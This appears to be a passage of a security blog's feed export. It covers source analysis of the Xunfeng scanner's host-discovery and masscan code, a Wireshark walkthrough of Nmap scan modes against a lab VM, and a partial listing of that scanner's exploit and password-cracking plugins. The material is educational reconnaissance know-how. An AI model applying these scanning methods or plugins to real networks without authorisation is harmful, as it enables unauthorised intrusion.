class="title">__init__</span><span class="params">(self, timeout=<span class="number">3</span>)</span>:</span></span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        self.__data = struct.pack(<span class="string">'d'</span>, time.time())</span><br><span class="line">        self.__id = os.getpid()</span><br><span class="line">        <span class="keyword">if</span> self.__id &gt;= <span class="number">65535</span>: self.__id = <span class="number">65534</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__icmpSocket</span><span class="params">(self)</span>:</span></span><br><span class="line">        Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname(<span class="string">"icmp"</span>))</span><br><span class="line">        <span class="keyword">return</span> Sock</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inCksum</span><span class="params">(self, packet)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(packet) &amp; <span class="number">1</span>:</span><br><span class="line">            packet = packet + <span class="string">'\0'</span></span><br><span class="line">        words = array.array(<span class="string">'h'</span>, packet)</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            sum += (word &amp; <span class="number">0xffff</span>)</span><br><span class="line">        sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>)</span><br><span class="line">        sum = sum + (sum &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> (~sum) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__icmpPacket</span><span class="params">(self)</span>:</span></span><br><span class="line">        header = struct.pack(<span class="string">'bbHHh'</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, self.__id, <span class="number">0</span>)</span><br><span class="line">        packet = header + self.__data</span><br><span class="line">        chkSum = self.__inCksum(packet)</span><br><span class="line">        header = struct.pack(<span class="string">'bbHHh'</span>, <span class="number">8</span>, <span class="number">0</span>, chkSum, self.__id, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> header + self.__data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mPing</span><span class="params">(self, ipPool)</span>:</span></span><br><span class="line">        Sock = self.__icmpSocket</span><br><span class="line">        Sock.settimeout(self.timeout)</span><br><span class="line">        packet = self.__icmpPacket</span><br><span class="line">        recvFroms = set()</span><br><span class="line">        sendThr = SendPingThr(ipPool, packet, Sock, self.timeout)</span><br><span class="line">        sendThr.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ac_ip = Sock.recvfrom(<span class="number">1024</span>)[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> ac_ip <span class="keyword">not</span> <span class="keyword">in</span> recvFroms:</span><br><span class="line">                    log.write(<span class="string">"active"</span>, ac_ip, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line">                    recvFroms.add(ac_ip)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> sendThr.isAlive():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> recvFroms &amp; ipPool</span><br></pre></td></tr></table></figure><p>大概流程就是使用原始套接字进行数据包构造</p><p>然后实例化一个<code>SendPingThr</code>类进行多线程发包</p><p>然后通过<code>set</code>的一个集合来去重，如果收到响应包，说明存活，最后判断线程是否存活，不存货则退出死循环，最终返回我们的扫描结果集合</p><p>然后回到我们的<code>start.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.masscan_ac[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">AC_PORT_LIST = self.masscan(</span><br><span class="line">                    ip_list, masscan_path, masscan_rate)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> AC_PORT_LIST:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                self.masscan_ac[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">masscan</span><span class="params">(self, ip, masscan_path, masscan_rate)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> len(ip) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            sys.path.append(sys.path[<span class="number">0</span>] + <span class="string">"/plugin"</span>)</span><br><span class="line">            m_scan = __import__(<span class="string">"masscan"</span>)</span><br><span class="line">            result = m_scan.run(ip, masscan_path, masscan_rate)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'No masscan plugin detected'</span></span><br></pre></td></tr></table></figure><p>动态调用<code>masscan</code>，然后启动扫描，<code>masscan</code>放到最后看</p><p>然后把扫描结果加入到队列里</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> AC_PORT_LIST:</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line">  self.masscan_ac[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> ip_str <span class="keyword">in</span> AC_PORT_LIST.keys():</span><br><span class="line">    self.queue.put(ip_str)  <span class="comment"># 加入队列</span></span><br><span class="line">  self.scan_start()  <span class="comment"># 开始扫描</span></span><br></pre></td></tr></table></figure><p>看一下<code>scan_start</code>函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_start</span><span class="params">(self)</span>:</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(self.thread):  <span class="comment"># 开始扫描</span></span><br><span class="line">    t = ThreadNum(self.queue)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.mode = self.mode</span><br><span class="line">    t.config_ini = self.config_ini</span><br><span class="line">    t.statistics = self.statistics</span><br><span class="line">    t.start()</span><br><span class="line">  self.queue.join()</span><br><span class="line"><span class="comment">###################################################</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadNum</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, queue)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                task_host = self.queue.get(block=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.mode:</span><br><span class="line">                    port_list = AC_PORT_LIST[task_host]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    port_list = self.config_ini[<span class="string">'Port_list'</span>].split(<span class="string">'|'</span>)[</span><br><span class="line">                        <span class="number">1</span>].split(<span class="string">'\n'</span>)</span><br><span class="line">                _s = scan.scan(task_host, port_list)</span><br><span class="line">                _s.config_ini = self.config_ini  <span class="comment"># 提供配置信息</span></span><br><span class="line">                _s.statistics = self.statistics  <span class="comment"># 提供统计信息</span></span><br><span class="line">                _s.run()</span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> e</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.queue.task_done()</span><br></pre></td></tr></table></figure><p>大概流程就是实例化了一个<code>ThreadNum</code>类</p><p>里面从队列中调取IP地址，然后读取扫描的端口调用<code>scan.scan</code>类</p><p>这个类文件很多，我们简单说一下流程</p><ol><li>使用原始套接字进行端口扫描，讲扫到的端口写入<code>Mongo</code>，合并历史扫描数据</li><li>服务识别，使用<code>default</code>和<code>banner</code>区分</li><li>如果识别的服务名为空，则尝试web访问</li></ol><p>如果想调用<code>masscan</code>进行扫描的话</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#author:wolf</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(ip_list,path,rate)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip_file = open(<span class="string">'target.log'</span>,<span class="string">'w'</span>)</span><br><span class="line">        ip_file.write(<span class="string">"\n"</span>.join(ip_list))</span><br><span class="line">        ip_file.close()</span><br><span class="line">        path = str(path).translate(<span class="literal">None</span>, <span class="string">';|&amp;`\n'</span>)</span><br><span class="line">        rate = str(rate).translate(<span class="literal">None</span>, <span class="string">';|&amp;`\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):<span class="keyword">return</span></span><br><span class="line">        os.system(<span class="string">"%s -p1-65535 -iL target.log -oL tmp.log --randomize-hosts --rate=%s"</span>%(path,rate))</span><br><span class="line">        result_file = open(<span class="string">'tmp.log'</span>, <span class="string">'r'</span>)</span><br><span class="line">        result_json = result_file.readlines()</span><br><span class="line">        result_file.close()</span><br><span class="line">        <span class="keyword">del</span> result_json[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">del</span> result_json[<span class="number">-1</span>]</span><br><span class="line">        open_list = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> res <span class="keyword">in</span> result_json:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ip = res.split()[<span class="number">3</span>]</span><br><span class="line">                port = res.split()[<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">if</span> ip <span class="keyword">in</span> open_list:</span><br><span class="line">                    open_list[ip].append(port)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    open_list[ip] = [port]</span><br><span class="line">            <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">        os.remove(<span class="string">'target.log'</span>)</span><br><span class="line">        os.remove(<span class="string">'tmp.log'</span>)</span><br><span class="line">        <span class="keyword">return</span> open_list</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>很粗暴，通过读写文件存储中间结果，然后写入变量后删除临时文件</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大概流程就是这样吧，好多东西只有当自己亲手研究时候，才能发现其中的优点以及存在的问题</p><h2 id="巡风我认为的问题"><a href="#巡风我认为的问题" class="headerlink" title="巡风我认为的问题"></a>巡风我认为的问题</h2><ol><li>好多代码没有重用，就比如资产扫描和漏洞扫描里的get_code函数在两个模块写了两次</li><li>使用了urllib2，可以用request代替</li><li>心跳间距过长，可能导入配置后得最少30秒才能启动扫描</li></ol><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol><li>使用两个模块的心跳检测来触发扫描，这样可以逻辑分离，并且可以通过前端修改配置来通过心跳检测来触发扫描</li><li>支持插件热更新，原理是通过心跳检测新版本然后下载，通过前端触发安装</li><li>模块分开编写，容易修改、重构</li><li>自定义payload方便，有固定的格式，并且可以通过心跳检测更新配置</li><li>支持调用masscan，把扫描目标写入target.log和tmp.log来临时保存，读取后删除文件</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;巡风漏洞扫描系统资产搜集模块源码分析&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全研发" scheme="https://a2u13.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E5%8F%91/"/>
    
    
      <category term="巡风" scheme="https://a2u13.com/tags/%E5%B7%A1%E9%A3%8E/"/>
    
  </entry>
  
  <entry>
    <title>用Wireshark分析Nmap的各种扫描方式</title>
    <link href="https://a2u13.com/2020/03/24/%E7%94%A8Wireshark%E5%88%86%E6%9E%90Nmap%E7%9A%84%E5%90%84%E7%A7%8D%E6%89%AB%E6%8F%8F%E6%96%B9%E5%BC%8F/"/>
    <id>https://a2u13.com/2020/03/24/%E7%94%A8Wireshark%E5%88%86%E6%9E%90Nmap%E7%9A%84%E5%90%84%E7%A7%8D%E6%89%AB%E6%8F%8F%E6%96%B9%E5%BC%8F/</id>
    <published>2020-03-24T14:48:21.000Z</published>
    <updated>2020-06-07T06:28:28.924Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>对Wireshark抓取Nmap扫描包的分析</p><a id="more"></a><p>这里目标选择VMWare下的另一台Ununtu18.04虚拟机（IP:192.168.192.137）</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpswFlvSR.jpg" alt="img"> </p><h1 id="使用全连接模式（-sT）"><a href="#使用全连接模式（-sT）" class="headerlink" title="使用全连接模式（-sT）"></a>使用全连接模式（-sT）</h1><p>通过调用TCP connect()来向目标端口发送连接请求</p><p>通过发送SYN数据包请求建立连接，若靶机开启端口则会建立完整的TCP连接</p><p>而未开启的端口会返回RST/ACK报文，不会建立完整的TCP连接</p><p>这种扫描方式缺点是会留下扫描纪录，而且速度较慢。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wps4HewXC.jpg" alt="img"></p><p>如果端口是关闭的，则会返回RST/ACK报文断开连接，说明端口是关闭的。</p><p>Nmap尝试向目标靶机所有端口发送SYN包</p><p>若端口是打开的，返回了SYN,ACK则表明端口开放，然后扫描主机箱目标机发送ACK/RST包断开连接</p><p>建立完整的TCP连接如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpseNnGuu.jpg" alt="img"></p><p>扫描结果如下图所示：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsZq7BAg.jpg" alt="img"></p><h1 id="使用半连接模式（-sS）"><a href="#使用半连接模式（-sS）" class="headerlink" title="使用半连接模式（-sS）"></a>使用半连接模式（-sS）</h1><p>本机向靶机发送SYN数据包，靶机开启的端口会出现TCP半连接，通过发送RST包来关闭连接</p><p>而未开启的端口会返回RST/ACK报文，不会出现TCP连接</p><p>如果没有收到回复，那么判断为该端口被屏蔽(Filtered)</p><p>这种扫描方式因为不会建立完整的TCP连接，比较隐蔽，扫描速度也比较快，是Namp默认的扫描方式。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsFk69Gl.jpg" alt="img"></p><p>对于关闭的端口则返回RST/ACK报文关闭TCP连接</p><p>同样对所有的端口尝试进行SYN连接</p><p>如果端口是打开的，则会出现半连接，在目标靶机向扫描主机发送SYN应答包后发送RST包来断开TCP连接</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsBsnDgD.jpg" alt="img"></p><p>扫描结果如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsncb003.jpg" alt="img"></p><h1 id="使用TCP-Null模式-sN"><a href="#使用TCP-Null模式-sN" class="headerlink" title="使用TCP Null模式 (-sN)"></a>使用TCP Null模式 (-sN)</h1><p>NULL扫描当主机向靶机一个端口发送的TCP数据包所有标志位都为空</p><p>如果目标主机该端口是关的，则返回一个RST数据包，若没有收到说明端口是开放的或者被屏蔽</p><p>可以看到nmap尝试向目标所有端口发送标志位全为空的TCP数据包</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsbefzHR.jpg" alt="img"></p><p>当目标端口是关闭的时候，则会返回RST/ACK包</p><p>如果端口是开放的则不会返回信息</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsB3EvoF.jpg" alt="img"></p><p>扫描结果如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpschi7SA.jpg" alt="img"></p><h1 id="使用FIN扫描模式（-sF）"><a href="#使用FIN扫描模式（-sF）" class="headerlink" title="使用FIN扫描模式（-sF）"></a>使用FIN扫描模式（-sF）</h1><p>FIN段负责表示发送端已经没有数据要传输了，希望释放连接</p><p>发送一个FIN=1的报文到一个关闭的端口时该报文会被丢掉，并返回一个RST报文</p><p>但是当FIN报文到一个活动的端口时，该报文只是被简单的丢掉不回应任何信息</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsxAHxhC.jpg" alt="img"></p><p>Nmap尝试对所有端口发送一个FIN包，对于关闭的端口会返回一个RST/ACK包表示端口是关闭状态</p><p>对于开放的端口则会简单丢掉而不会返回RST应答包</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsqpLtQK.jpg" alt="img"></p><p>扫描结果如下图所示：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsgeHXGb.jpg" alt="img"></p><h1 id="使用XMAS扫描模式（-sX）"><a href="#使用XMAS扫描模式（-sX）" class="headerlink" title="使用XMAS扫描模式（-sX）"></a>使用XMAS扫描模式（-sX）</h1><p>Xmas扫描是将数据包中的FIN,PSH,URG标记为on</p><p>通过发送这种非常规的数据包来判断目标系统中端口的当前状态</p><p>和NULL扫描一样，如果目标主机该端口是关的，则返回一个RST数据包，否则不会回复。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsGyBetM.jpg" alt="img"></p><p>可以看到Nmap向目标主机发送大量FIN/PSH/URG包</p><p>对于关闭的端口，则会返回RST/ACK包</p><p>对于开放或者被屏蔽的端口，则不会有应答消息</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpswj7j9s.jpg" alt="img"></p><p>扫描结果如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsSnas6q.jpg" alt="img"></p><h1 id="使用UDP扫描模式（-sU）"><a href="#使用UDP扫描模式（-sU）" class="headerlink" title="使用UDP扫描模式（-sU）"></a>使用UDP扫描模式（-sU）</h1><p>UDP端口扫描主要是检测靶机的端口是否存在ICMP端口不可达数据包</p><p>如果收到回复“ICMP port unreachable”说明对方这一端口是关闭的，否则就说明该端口已经开启或者被屏蔽了</p><p>这里由于UDP扫描巨慢，选择1-200号端口进行扫描</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsmV7lkd.jpg" alt="img"></p><p>这里收到的全是ICMP port unreachable报文，说所有的端口都是关闭的或是被屏蔽了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpssBfOrH.jpg" alt="img"> </p><p>扫描结果如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsJq9rMi.jpg" alt="img"></p><h1 id="使用ACK扫描模式（-sA）"><a href="#使用ACK扫描模式（-sA）" class="headerlink" title="使用ACK扫描模式（-sA）"></a>使用ACK扫描模式（-sA）</h1><p>当发送给靶机一个ACK报文的时候，如果收到RST包，说明该端口没有被防火墙屏蔽</p><p>没有收到RST包，说明被屏蔽</p><p>ACK可以利用来扫描防火墙的配置，用它来发现防火墙是否屏蔽某些端口，确定哪些端口是被过滤的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsMaHg40.jpg" alt="img"></p><p>经过观察所有的端口返回了RST报文，说明所有的端口没有被屏蔽</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpscfSbgw.jpg" alt="img"></p><h1 id="使用Nmap系统探测模式（-O）"><a href="#使用Nmap系统探测模式（-O）" class="headerlink" title="使用Nmap系统探测模式（-O）"></a>使用Nmap系统探测模式（-O）</h1><p><strong>探测原理：</strong></p><p>NAMP 带有一个数据库nmap-os-db，它在你安装 NAMP 的时候就会被安装，他其中包含了2600多种操作系统与设备类型</p><p>操作系统探测利用的是 IP/TCP 层面上的特征</p><p>在 nmap-os-db 里面，每个特征以 Fingerprint 开头，接着是该特征对应的操作系统信息，然后是具体的特征值</p><p>Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备</p><p>不同操作系统的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。</p><p>下图为：nmap-os-db文件内容：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsaYxLVp.jpg" alt="img"></p><p>会执行五种不同的测试，每种测试由一个或者多个数据包组成，目标系统对每个数据包作出的响应有助于确定操作系统的类型。</p><p>五种不同的测试是：</p><ol><li><p>序列生成</p><p>序列生成测试由六个数据包组成，这六个包是每隔 100 毫秒分开发送的，且都是 TCP SYN 包。</p><p>每个 TCP SYN 包的结果将有助于 NMAP 确定操作系统的类型。</p></li><li><p>ICMP回显</p><p>两个有着不同设置的 ICMP 请求包被送到目标系统，由此产生的反应将有助于实现验证操作系统类型。</p></li><li><p>TCP显式拥塞通知</p><p>当生成许多包通过路由器时会导致其负载变大，这称之为拥塞</p><p>其结果就是系统会变慢以降低拥堵，以便路由器不会发生丢包</p><p>这个包仅为了得到目标系统的响应而发送</p><p>因为不同的操作系统以不同的方式处理这个包，所以返回的特定值可以用来判断操作系统。</p></li><li><p>TCP</p><p>在这个测试中会发送六个数据包。</p><p>一些带有特定的包设置的包被发送用来到打开的或关闭的端口。结果也将会因为操作系统的不同而不同。</p><p>所有 TCP 包都是以如下不同的标志被发送：</p><p>①无标志</p><p>②SYN、FIN、URG 和 PSH</p><p>③ACK</p><p>④SYN</p><p>⑤ACK</p><p>⑥FIN、PSH 和 URG</p></li><li><p>UDP</p><p>这个测试由一个被发送给一个关闭的端口的数据包组成。</p></li></ol><p>所有的测试分成五组：<br>第一组测试包含 SEQ、OPS、WIN、T1。这项测试会发送六个 TCP 包，然后检查响应的各种细节</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wps7JJAzM.jpg" alt="img"></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsXuzI1y.jpg" alt="img"></p><p>第二组测试是 IE，会发送两个不同的 ICMP echo 请求，检测其响应特征</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wps2XYczH.jpg" alt="img"></p><p>第三组测试是 U1，发送一个 UDP 包给一个关闭的端口，然后看下 ICMP 的 port unreachable 回复</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpstWAMtZ.jpg" alt="img"></p><p>第四组测试是 ECN，全称是 Explicit Congestion Notification，即“显式拥塞通知”。该测试会发送带 ECN 位的 TCP 请求，比较其响应</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsVEQ9iN.jpg" alt="img"></p><p>最后一组是发送六个不同的 TCP 包，这六个 TCP 包的响应结果将对应T2到T7的各项指标，其中 T2-T4 会发给打开的 TCP 端口，T5-T7 会发给关闭的 TCP 端口</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wps4wMY16.jpg" alt="img"></p><p>如果目标系统上的这个端口是关闭的，而且返回一条 ICMP 端口不可达的信息，那么就说明没有防火墙</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsQZjSnN.jpg" alt="img"></p><p>使用nmap -O 192.168.192.138命令对虚拟机进行扫描</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsMg3CQF.jpg" alt="img"></p><p>扫描出目标靶机端口开放情况</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/wpsbFb6RK.jpg" alt="img"></p><p>对于操作系统探测，我这里使用的Ubuntu18.04，Linux版本号为4.15，这里探测结果为4.X，较为准确</p><p>不过根据网上的经验，Nmao对于操作系统识别，只能大致识别出类型与大概版本号，对于精确识别是无能为力的</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对Wireshark抓取Nmap扫描包的分析&lt;/p&gt;
    
    </summary>
    
    
      <category term="原理分析" scheme="https://a2u13.com/categories/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Nmap" scheme="https://a2u13.com/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>巡风漏洞扫描系统漏洞扫描模块源码分析</title>
    <link href="https://a2u13.com/2020/03/23/%E5%B7%A1%E9%A3%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://a2u13.com/2020/03/23/%E5%B7%A1%E9%A3%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-03-23T14:19:28.000Z</published>
    <updated>2020-06-07T06:28:28.924Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>巡风漏洞扫描系统漏洞扫描模块源码分析</p><a id="more"></a><h1 id="总体架构"><a href="#总体架构" class="headerlink" title="总体架构"></a>总体架构</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/%E4%B8%BB%E5%87%BD%E6%95%B0.jpg" alt="主函数"></p><h1 id="框架目录"><a href="#框架目录" class="headerlink" title="框架目录"></a>框架目录</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="selector-tag">kunpeng</span><span class="selector-class">.py</span></span><br><span class="line">├── <span class="selector-tag">kunpeng_c</span><span class="selector-class">.dll</span></span><br><span class="line">├── <span class="selector-tag">kunpeng_c</span><span class="selector-class">.dylib</span></span><br><span class="line">├── <span class="selector-tag">kunpeng_c</span><span class="selector-class">.so</span></span><br><span class="line">├── <span class="selector-tag">vuldb</span></span><br><span class="line">│   ├── <span class="selector-tag">Confluence_CVE20158399</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">Docker_Remote_API_20161220120458</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">ElasticSearch_unauth</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">MS10-070</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">MS15-034</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">MS17_010</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">activemq_upload</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">axis_config_read</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">axis_info</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_axis</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_cisco_web</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_ftp</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_glassfish</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_grafana</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_jboss</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_jenkins</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_mongo</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_mssql</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_mysql</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_postgres</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_redis</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_resin</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_supervisor_web</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">crack_weblogic</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">fastcgi_rce</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">git_index_disclosure</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">glassfish_filread</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">hadoop_yarn_resourcemanager_unauth_rce</span><span class="selector-class">.json</span></span><br><span class="line">│   ├── <span class="selector-tag">heartbleed_poc</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">hikvision_crackpass</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">iis_shortfile</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">iis_webdav</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">iis_webdav_rce</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">java_rmi_rce</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">jboss_head</span><span class="selector-class">.py</span></span><br><span class="line">│   ├── <span class="selector-tag">jboss_info</span><span class="selector-class">.json</span></span><br><span 